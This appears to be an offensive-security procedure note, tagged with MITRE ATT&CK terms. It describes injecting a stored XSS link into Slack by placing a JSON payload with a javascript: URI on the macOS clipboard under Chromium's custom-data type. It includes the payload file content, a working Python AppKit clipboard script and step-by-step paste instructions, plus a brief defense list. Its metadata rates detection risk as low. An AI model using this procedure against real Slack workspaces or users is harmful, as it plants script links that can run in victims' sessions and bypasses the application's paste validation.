---
tags:
  - xss
  - clipboard-injection
  - python
type: procedure
tools:
  - '[[tools/Python]]'
  - '[[tools/Google-Chrome]]'
  - '[[tools/Clipboard-Viewer]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/set-chromium-clipboard-payload]]'
platforms:
  - macOS
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: advanced
impact_level: medium
detection_risk: low
sub_techniques: []
id: abef69ee-9d09-4c15-8e31-727dcd6a4875
created_at: '2025-12-13T23:55:38.186Z'
updated_at: '2025-12-13T23:55:38.186Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-via-Clipboard-Manipulation

## Summary

This procedure uses a Python script to inject a malicious JSON payload into the clipboard with a custom UTI, allowing paste into Slack's editor to create a failed unfurl containing the javascript: URI.

## Description

On macOS with Chrome, set the clipboard using org.chromium.web-custom-data UTI to embed XSS payload. Pasting in Slack triggers insertion without validation, alternative to WebSocket method.

## Requirements

1. macOS with Python 2.7.10
2. File 'chromium' containing JSON payload with malicious link
3. Google Chrome for UTI support

## Defense

Defensive measures and detection strategies:

- Sanitize clipboard data on paste in web apps
- Block custom UTIs in editor parsing
- Monitor for failed unfurls in logs

## Objectives

1. Bypass direct insertion limits
2. Insert persistent XSS link
3. Enable click-based execution

## Instructions

### Step 1: Prepare Payload File

**Context**: Create 'chromium' file with JSON including the javascript: link.

Example content: {"version":1,"customData":{"links":[{"url":"javascript:alert('XSS')"}]}}

> Expected: Valid JSON file ready.

### Step 2: Execute Clipboard Script

**Context**: Run the Python command to set clipboard.

Execute [[commands/set-chromium-clipboard-payload]]:

```python
from AppKit import NSPasteboard, NSData
uti = "org.chromium.web-custom-data"
chromium = open('chromium').read()
pb = NSPasteboard.generalPasteboard()
pb.clearContents()
pb.declareTypes_owner_([uti], None)
data = NSData.dataWithBytes_length_(chromium, len(chromium))
pb.setData_forType_(data, uti)
```

> Expected: No output; clipboard updated. Verify with [[tools/Clipboard-Viewer]].

### Step 3: Paste in Slack

**Context**: Paste into editor to insert payload.

Ctrl+V in Markdown editor.

> Expected: Failed unfurl with clickable malicious link.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/set-chromium-clipboard-payload]]

## Tools Used

- [[tools/Python]]
- [[tools/Google-Chrome]]
- [[tools/Clipboard-Viewer]]

## Tags

- [[xss]]
- [[clipboard-injection]]
